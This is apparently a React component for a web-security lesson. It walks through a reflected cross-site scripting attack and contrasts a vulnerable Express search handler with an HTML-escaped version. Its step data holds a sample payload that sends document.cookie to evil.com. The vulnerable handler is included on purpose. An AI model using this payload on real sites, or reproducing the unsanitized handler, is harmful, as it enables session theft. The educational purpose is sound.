import { AnimatePresence, motion } from "motion/react";
import { useState } from "react";
import { ShikiCode } from "../shared/ShikiCode";

const VULNERABLE_CODE = `// Vulnerable server (Node/Express)
app.get('/search', (req, res) => {
  const query = req.query.q;
  // VULNERABLE: directly interpolating user input into HTML
  res.send(\`<p>Results for: \${query}</p>\`);
});`;

const SECURE_CODE = `// Secure version — HTML entity encode all output
import { escape } from 'html-escaper';

app.get('/search', (req, res) => {
  const query = escape(req.query.q as string);
  // angle brackets become &lt; &gt; — rendered as text, not parsed as tags
  res.send(\`<p>Results for: \${query}</p>\`);
});`;

const ATTACK_STEPS = [
	{
		actor: "Attacker",
		actorColor: "text-rose-400",
		label: "Craft malicious URL",
		detail:
			'https://bank.example.com/search?q=<script>fetch("https://evil.com/?c="+document.cookie)</script>',
	},
	{
		actor: "Victim",
		actorColor: "text-sky-400",
		label: "Clicks the link",
		detail: "Browser sends GET /search?q=[payload] to bank.example.com",
	},
	{
		actor: "Server",
		actorColor: "text-zinc-300",
		label: "Reflects payload into HTML (no sanitization)",
		detail:
			"<p>Results for: <script>fetch('https://evil.com/?c='+document.cookie)</script></p>",
	},
	{
		actor: "Browser",
		actorColor: "text-zinc-300",
		label: "Parses and executes the script",
		detail: "Script runs in victim's browser context — reads document.cookie",
	},
	{
		actor: "Attacker",
		actorColor: "text-rose-400",
		label: "Receives stolen session",
		detail: "evil.com/?c=session=abc123xyz — victim's session stolen",
	},
] as const;

export function ReflectedXSSDemo() {
	const [step, setStep] = useState(-1);
	const [sanitized, setSanitized] = useState(false);
	// Locks in the mode at the moment "Start Attack" is clicked — prevents
	// mid-flow toggle from retroactively changing the attack outcome.
	const [sanitizedAtStart, setSanitizedAtStart] = useState<boolean | null>(
		null,
	);
	const [searchInput, setSearchInput] = useState(
		'<script>alert("xss")</script>',
	);

	const isRunning = step >= 0;
	// Use the locked-in value during an active run; fall back to current toggle otherwise
	const effectiveSanitized = sanitizedAtStart ?? sanitized;
	const attackBlocked = effectiveSanitized && step >= 2;

	function startAttack() {
		setSanitizedAtStart(sanitized);
		setStep(0);
	}

	function advanceStep() {
		if (step < ATTACK_STEPS.length - 1) {
			setStep((s) => s + 1);
		}
	}

	function reset() {
		setStep(-1);
		setSanitizedAtStart(null);
	}

	const displayedQuery = sanitized
		? searchInput
				.replace(/&/g, "&amp;")
				.replace(/</g, "&lt;")
				.replace(/>/g, "&gt;")
				.replace(/"/g, "&quot;")
				.replace(/'/g, "&#x27;")
		: searchInput;

	return (
		<div className="space-y-6">
			{/* Simulated search */}
			<div className="bg-zinc-800 rounded-lg p-4 border border-zinc-700">
				<p className="text-xs text-zinc-400 mb-3 uppercase tracking-wider font-semibold">
					Simulated Search Page
				</p>
				<div className="flex gap-2 mb-3">
					<input
						type="text"
						value={searchInput}
						onChange={(e) => setSearchInput(e.target.value)}
						className="flex-1 bg-zinc-900 border border-zinc-600 rounded px-3 py-2 text-sm text-white font-mono"
						placeholder="Try: <script>alert('xss')</script>"
					/>
				</div>
				<div className="bg-zinc-900 rounded p-3 text-sm border border-zinc-700">
					<span className="text-zinc-400">Server response: </span>
					<span className="text-zinc-300">Results for: </span>
					<span className={sanitized ? "text-emerald-400" : "text-red-400"}>
						{displayedQuery}
					</span>
					{!sanitized && (
						<span className="ml-2 text-xs text-red-400 bg-red-500/20 px-2 py-0.5 rounded">
							⚠ Script would execute
						</span>
					)}
					{sanitized && (
						<span className="ml-2 text-xs text-emerald-400 bg-emerald-500/20 px-2 py-0.5 rounded">
							✓ Rendered as text
						</span>
					)}
				</div>
			</div>

			{/* Toggle — disabled while attack running to prevent mid-flow confusion */}
			<div className="flex items-center gap-3 flex-wrap">
				<button
					type="button"
					disabled={isRunning}
					onClick={() => setSanitized(false)}
					className={`px-4 py-2 rounded text-sm font-medium transition-colors disabled:opacity-40 disabled:cursor-not-allowed ${
						!sanitized
							? "bg-red-500/20 text-red-400 border border-red-500"
							: "bg-zinc-800 text-zinc-400 border border-zinc-700 hover:border-zinc-600"
					}`}
				>
					No Sanitization (Vulnerable)
				</button>
				<button
					type="button"
					disabled={isRunning}
					onClick={() => setSanitized(true)}
					className={`px-4 py-2 rounded text-sm font-medium transition-colors disabled:opacity-40 disabled:cursor-not-allowed ${
						sanitized
							? "bg-emerald-500/20 text-emerald-400 border border-emerald-500"
							: "bg-zinc-800 text-zinc-400 border border-zinc-700 hover:border-zinc-600"
					}`}
				>
					HTML Entity Encoded (Secure)
				</button>
				{isRunning && (
					<span className="text-xs text-zinc-500 italic">
						Reset to change mode
					</span>
				)}
			</div>

			{/* Attack flow */}
			<div>
				<div className="flex items-center justify-between mb-3">
					<p className="text-sm font-semibold text-zinc-300">Attack Flow</p>
					<div className="flex gap-2">
						{!isRunning ? (
							<button
								type="button"
								onClick={startAttack}
								className="px-3 py-1.5 bg-red-500/20 text-red-400 border border-red-500 rounded text-xs font-medium hover:bg-red-500/30 transition-colors"
							>
								▶ Start Attack
							</button>
						) : (
							<>
								{step < ATTACK_STEPS.length - 1 && (
									<button
										type="button"
										onClick={advanceStep}
										className="px-3 py-1.5 bg-zinc-700 text-zinc-300 rounded text-xs font-medium hover:bg-zinc-600 transition-colors"
									>
										Next Step →
									</button>
								)}
								<button
									type="button"
									onClick={reset}
									className="px-3 py-1.5 bg-zinc-800 text-zinc-400 rounded text-xs font-medium hover:bg-zinc-700 transition-colors"
								>
									Reset
								</button>
							</>
						)}
					</div>
				</div>

				<div className="space-y-2">
					{ATTACK_STEPS.map((s, i) => (
						// Static array — index is a stable key
						// biome-ignore lint/suspicious/noArrayIndexKey: static constant array, never reordered
						<AnimatePresence key={i}>
							{i <= step && (
								<motion.div
									initial={{ opacity: 0, x: -12 }}
									animate={{ opacity: 1, x: 0 }}
									className={`rounded-lg p-3 border text-sm ${
										attackBlocked && i >= 2
											? "bg-emerald-500/10 border-emerald-500/40"
											: i === ATTACK_STEPS.length - 1 && !effectiveSanitized
												? "bg-red-500/20 border-red-500"
												: "bg-zinc-800 border-zinc-700"
									}`}
								>
									<div className="flex items-start gap-2">
										<span
											className={`font-semibold text-xs ${s.actorColor} shrink-0 mt-0.5`}
										>
											{s.actor}
										</span>
										<span className="text-zinc-300 text-xs">{s.label}</span>
										{attackBlocked && i === 2 && (
											<span className="ml-auto text-emerald-400 text-xs font-semibold shrink-0">
												✓ BLOCKED
											</span>
										)}
										{!effectiveSanitized && i === ATTACK_STEPS.length - 1 && (
											<span className="ml-auto text-red-400 text-xs font-semibold shrink-0">
												🔴 SESSION STOLEN
											</span>
										)}
									</div>
									<p className="mt-1 text-xs text-zinc-500 font-mono break-all">
										{s.detail}
									</p>
								</motion.div>
							)}
						</AnimatePresence>
					))}
				</div>
			</div>

			{/* Code block reflects toggle, not attack state — allows studying both modes */}
			<div>
				<p className="text-xs text-zinc-400 mb-2 font-semibold uppercase tracking-wider">
					{sanitized ? "Secure Implementation" : "Vulnerable Implementation"}
				</p>
				<ShikiCode
					language="typescript"
					code={sanitized ? SECURE_CODE : VULNERABLE_CODE}
					className="text-xs"
				/>
			</div>
		</div>
	);
}
